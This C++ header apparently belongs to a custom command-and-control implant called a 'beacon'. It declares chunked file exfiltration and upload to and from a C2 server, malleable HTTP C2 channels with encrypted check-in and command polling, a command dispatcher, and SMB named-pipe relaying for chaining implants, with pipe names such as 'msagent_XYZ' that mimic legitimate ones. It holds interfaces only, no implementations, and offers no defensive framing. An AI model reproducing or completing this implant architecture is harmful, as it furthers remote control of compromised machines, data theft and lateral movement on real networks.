#pragma once

#include <cstdint>
#include <cstddef>
#include <utility>
#include "config_parser.h"
#include "resolver.h"
#include "pandragon_runtime.h"
#include "network/net_abstract.h"

/* ============================================================================
 * Global Function Table Pointer (extern declaration)
 * ============================================================================ */

extern functionTable* g_functionTable;

/* ============================================================================
 * Forward Declarations
 * ============================================================================ */

/* ============================================================================
 * File Transfer Manager
 * ============================================================================ */

/**
 * @brief File transfer direction
 */
enum class FileTransferDir : uint8_t {
    NONE     = 0,
    DOWNLOAD = 1,
    UPLOAD   = 2
};

/**
 * @brief File transfer status
 */
enum class FileTransferStatus : uint8_t {
    IDLE     = 0,
    ACTIVE   = 1,
    COMPLETE = 2,
    _ERROR    = 3
};

/**
 * @brief File transfer state for a single slot
 */
struct FileTransferState {
    FileTransferDir     direction;
    FileTransferStatus  status;
    wchar_t             path[512];
    uint32_t            fileSize;
    uint32_t            bytesTransferred;
    uint32_t            chunkSize;
    uint32_t            expectedChunkIndex;
    HANDLE              fileHandle;
    uint32_t            lastChunkIndex;
    uint64_t            lastActivity;
    uint32_t            chunkCount;

    FileTransferState()
        : direction(FileTransferDir::NONE)
        , status(FileTransferStatus::IDLE)
        , fileSize(0)
        , bytesTransferred(0)
        , chunkSize(0)
        , expectedChunkIndex(0)
        , fileHandle(nullptr)
        , lastChunkIndex(0)
        , lastActivity(0)
        , chunkCount(0)
    {
        path[0] = L'\0';
    }

    void reset(functionTable* funcTable = nullptr) {
        functionTable* ft = funcTable ? funcTable : g_functionTable;
        if (fileHandle && fileHandle != INVALID_HANDLE_VALUE && ft) {
            ft->NtClose(fileHandle);
        }
        direction         = FileTransferDir::NONE;
        status            = FileTransferStatus::IDLE;
        fileSize          = 0;
        bytesTransferred  = 0;
        chunkSize         = 0;
        expectedChunkIndex = 0;
        fileHandle        = nullptr;
        lastChunkIndex    = 0;
        lastActivity      = 0;
        chunkCount        = 0;
        path[0]           = L'\0';
    }
};

/**
 * @brief Manages concurrent file transfers
 * 
 * Handles both download (beacon -> server) and upload (server -> beacon)
 * operations with chunked transfer support and timeout detection.
 */
class FileTransferManager {
public:
    static constexpr uint8_t  MAX_FILE_TRANSFERS        = 4;
    static constexpr uint32_t TRANSFER_TIMEOUT_SECONDS  = 300;

    /**
     * @brief Construct file transfer manager
     * @param runtime Parent runtime for accessing functionTable
     */
    FileTransferManager();
    ~FileTransferManager();

    // Non-copyable
    FileTransferManager(const FileTransferManager&)            = delete;
    FileTransferManager& operator=(const FileTransferManager&) = delete;

    /**
     * @brief Initialize all transfer slots
     */
    void initialize();

    // =========================================================================
    // Download Operations
    // =========================================================================

    /**
     * @brief Start a file download (beacon -> server)
     * @param file_path Path to file on beacon
     * @param chunk_size Preferred chunk size
     * @return SUCCESS or error code
     */
    [[nodiscard]] BeaconError startDownload(const wchar_t* file_path, uint32_t chunk_size);

    /**
     * @brief Handle download chunk request from server
     * @param chunk_index Requested chunk index
     * @param offset Byte offset in file
     * @param chunk_size Requested chunk size
     * @return SUCCESS or error code
     */
    [[nodiscard]] BeaconError handleDownloadChunk(uint32_t chunk_index, uint32_t offset, uint32_t chunk_size);

    /**
     * @brief Get active download state (if any)
     */
    [[nodiscard]] FileTransferState* findActiveDownload();

    // =========================================================================
    // Upload Operations
    // =========================================================================

    /**
     * @brief Start a file upload (server -> beacon)
     * @param file_path Destination path on beacon
     * @param file_size Total file size
     * @param chunk_size Chunk size for transfer
     * @return SUCCESS or error code
     */
    [[nodiscard]] BeaconError startUpload(const wchar_t* file_path, uint32_t file_size, uint32_t chunk_size);

    /**
     * @brief Handle upload chunk data from server
     * @param chunk_index Chunk index
     * @param offset Byte offset in file
     * @param chunk_data Chunk data
     * @param chunk_size Chunk size
     * @param is_last True if this is the final chunk
     * @return SUCCESS or error code
     */
    [[nodiscard]] BeaconError handleUploadChunk(uint32_t chunk_index, uint32_t offset, 
                                    const uint8_t* chunk_data, uint32_t chunk_size, bool is_last);

    /**
     * @brief Get active upload state (if any)
     */
    [[nodiscard]] FileTransferState* findActiveUpload();

    // =========================================================================
    // Transfer Management
    // =========================================================================

    /**
     * @brief Check for stalled transfers and cleanup
     * Called periodically from main loop
     */
    void checkTimeouts();

    /**
     * @brief Get transfer state by slot ID
     */
    [[nodiscard]] FileTransferState* getTransfer(uint8_t slot_id);

    /**
     * @brief Reset a transfer slot
     */
    void resetTransfer(uint8_t slot_id);

private:
    /**
     * @brief Find a free transfer slot
     * @return Slot index or -1 if none available
     */
    int findFreeSlot();

    /**
     * @brief Check if a transfer is stalled
     */
    bool isTransferStalled(const FileTransferState* state) const;

    /**
     * @brief Get current timestamp (RDTSC)
     */
    static uint64_t getCurrentTimestamp();

    /**
     * @brief Validate download path
     */
    bool validateDownloadPath(const wchar_t* path, uint16_t path_len) const;

    /**
     * @brief Validate upload path
     */
    bool validateUploadPath(const wchar_t* path, uint16_t path_len) const;

    // State
    FileTransferState     m_transfers[MAX_FILE_TRANSFERS];
};

/* ============================================================================
 * Network Manager
 * ============================================================================ */

/**
 * @brief Manages network communication with C2 server
 * 
 * Handles packet serialization, encryption, and HTTP transport.
 */
class NetworkManager {
public:
    /**
     * @brief Construct network manager
     * @param runtime Parent runtime
     */
    NetworkManager();
    ~NetworkManager();

    // Non-copyable
    NetworkManager(const NetworkManager&)            = delete;
    NetworkManager& operator=(const NetworkManager&) = delete;

    /**
     * @brief Initialize network layer
     * @param host C2 server hostname
     * @param pollPath GET path for poll operations
     * @param submitPath POST path for submit operations
     * @param user_agent User-Agent string
     * @param port Server port
     * @return SUCCESS or error code
     */
    [[nodiscard]] BeaconError initialize(const wchar_t* host, const wchar_t* pollPath, 
                           const wchar_t* submitPath, const wchar_t* user_agent, uint16_t port);

    /**
     * @brief Mark network as initialized (called after ::initNetwork)
     */
    void setInitialized(bool initialized) { m_initialized = initialized; }

    /**
     * @brief Set beacon identity
     * @param beacon_id 8-byte beacon ID
     * @param crypto_key 32-byte encryption key
     */
    void setIdentity(const uint8_t* beacon_id, const uint8_t* crypto_key);

    /**
     * @brief Set malleable C2 configuration
     * @param config Beacon configuration with malleable settings
     */
    void setMalleableConfig(const BeaconConfig& config);

    /**
     * @brief Set active C2 channel: switches host/path/ua/port and resolves malleable
     * @param channelIndex Which channel in config (0..channel_count-1)
     * @param config Parsed BeaconConfig (must have channels + poll/submit malleable arrays)
     */
    void setActiveChannel(uint8_t channelIndex, const BeaconConfig& config);

    // =========================================================================
    // Communication
    // =========================================================================

    /**
     * @brief Send initial check-in to server
     * @return SUCCESS or error code
     */
    [[nodiscard]] BeaconError sendCheckin(const char* sysinfo = nullptr, size_t sysinfo_len = 0);

    /**
     * @brief Poll server for new commands
     * @param out_buffer Receives decrypted command data (caller must free)
     * @param out_len Receives command length
     * @return SUCCESS or error code
     */
    [[nodiscard]] BeaconError pollForCommands(uint8_t** out_buffer, size_t* out_len);

    /**
     * @brief Send command response to server
     * @param opcode Response opcode
     * @param data Response data
     * @param data_len Data length
     * @return SUCCESS or error code
     */
    [[nodiscard]] BeaconError sendResponse(uint8_t opcode, const uint8_t* data, size_t data_len);

    // =========================================================================
    // File Transfer Helpers
    // =========================================================================

    /**
     * @brief Send file chunk data
     */
    [[nodiscard]] BeaconError sendFileChunkData(uint32_t chunk_index, uint32_t offset, 
                                   uint32_t bytes_read, uint8_t status, const uint8_t* data);

    /**
     * @brief Send file upload acknowledgment
     */
    [[nodiscard]] BeaconError sendFileUploadAck(uint32_t chunk_index, uint8_t status);

    /**
     * @brief Send file download acknowledgment
     */
    [[nodiscard]] BeaconError sendFileDownloadAck(uint32_t file_size, uint8_t status);

    /**
     * @brief Send list files result
     */
    [[nodiscard]] BeaconError sendListFilesResult(const uint8_t* entries, uint32_t entry_count, 
                                     uint8_t status, const wchar_t* error_msg);

    /**
     * @brief Send key rotation acknowledgment
     */
    [[nodiscard]] BeaconError sendKeyRotateAck(uint8_t status);

private:
    bool              m_initialized;
    wchar_t           m_host[256];
    wchar_t           m_pollPath[256];
    wchar_t           m_submitPath[256];
    wchar_t           m_userAgent[256];
    wchar_t           m_wcsBuf[512];
    uint16_t          m_port;
};

/* ============================================================================
 * Command Dispatcher
 * ============================================================================ */

/**
 * @brief Dispatches commands to appropriate handlers
 * 
 * Uses a registration pattern for clean command routing.
 */
class CommandDispatcher {
public:
    /**
     * @brief Handler function type
     */
    using HandlerFunc = bool (*)(const uint8_t* args, size_t args_len);

    /**
     * @brief Construct command dispatcher
     * @param runtime Parent runtime
     */
    explicit CommandDispatcher();
    ~CommandDispatcher();

    // Non-copyable
    CommandDispatcher(const CommandDispatcher&)            = delete;
    CommandDispatcher& operator=(const CommandDispatcher&) = delete;

    /**
     * @brief Register a command handler
     * @param opcode Command opcode
     * @param handler Handler function
     * @return SUCCESS or error code
     */
    [[nodiscard]] BeaconError registerHandler(uint8_t opcode, HandlerFunc handler);

    /**
     * @brief Dispatch a command to its handler
     * @param opcode Command opcode
     * @param args Command arguments
     * @param args_len Argument length
     * @return true if beacon should exit, false to continue
     */
    [[nodiscard]] bool dispatch(uint8_t opcode, const uint8_t* args, size_t args_len);

    /**
     * @brief Initialize all built-in handlers
     */
    void initializeBuiltInHandlers();

private:
    HandlerFunc       m_handlers[256];
};

/* ============================================================================
 * P2P Relay Engine (SMB Beacon Chaining)
 * ============================================================================
 * Non-blocking, integrated into the main loop.
 * Parent stays fully operational while relaying child data opportunistically.
 */

#define MAX_RELAY_CHILDREN 8
#define MAX_PIPE_NAME_LEN 256
#define MAX_PIPE_PATH (MAX_PIPE_NAME_LEN + 14)  // \\.\pipe\ + name

struct PipeChild {
    PipeChild* next;              // linked list
    wchar_t    pipe_name[MAX_PIPE_NAME_LEN];  // e.g. "msagent_XYZ" (after \\.\pipe\)
    HANDLE     hListen;           // listening pipe (CreateNamedPipe, overlapped)
    HANDLE     hData;             // child data pipe (INVALID_HANDLE_VALUE if no child connected)
    OVERLAPPED ov;                // overlapped for non-blocking accept
    uint32_t   pipe_id;           // local ID (1, 2, 3...); server references this
    uint64_t   created_at;        // UTC seconds since epoch
    bool       active;            // true = pipe created, waiting for child or connected
};

// Global relay state (zero-init by default in .bss)
extern bool          g_relayEnabled;
extern PipeChild*    g_pipeChildren;
extern uint32_t      g_nextPipeId;

/* Relay engine functions (managers.cpp) */

/**
 * @brief Called each main loop iteration; drains child data before polling
 */
void pipeRelayCheck();

/**
 * @brief Enable relay mode (START_RELAY handler)
 */
void relayEnable();

/**
 * @brief Disable relay mode, drain all children (STOP_RELAY handler)
 */
void relayDisable();

/**
 * @brief Add a child to the relay list (RELAY_ADD_CHILD handler)
 * @param pipe_name Pipe name (without \\.\pipe\ prefix)
 * @param pipe_name_len Length of pipe name in wide chars
 * @param pipe_id Server-assigned local pipe ID
 * @return true on success
 */
[[nodiscard]] bool relayAddChild(const wchar_t* pipe_name, size_t pipe_name_len, uint32_t pipe_id);

/**
 * @brief Remove a child from the relay list (RELAY_REMOVE_CHILD handler)
 * @param pipe_id Server-assigned local pipe ID
 * @return true if found and removed
 */
[[nodiscard]] bool relayRemoveChild(uint32_t pipe_id);

/**
 * @brief Relay child data upstream to server (RELAY_CHILD_UP)
 * @param pipe_id Local pipe ID
 * @param data Encrypted packet from child
 * @param data_len Length of encrypted packet
 */
void sendRelayChildUp(uint32_t pipe_id, const void* data, size_t data_len);

/**
 * @brief Handle RELAY_DOWN: write child data to correct pipe
 * @param args Packet payload: [pipe_id (4B LE)] [encrypted packet]
 * @param args_len Total payload length
 */
bool relayHandleRelayDown(const uint8_t* args, size_t args_len);

/**
 * @brief Cleanup all relay state (called on beacon shutdown)
 */
void relayCleanup();

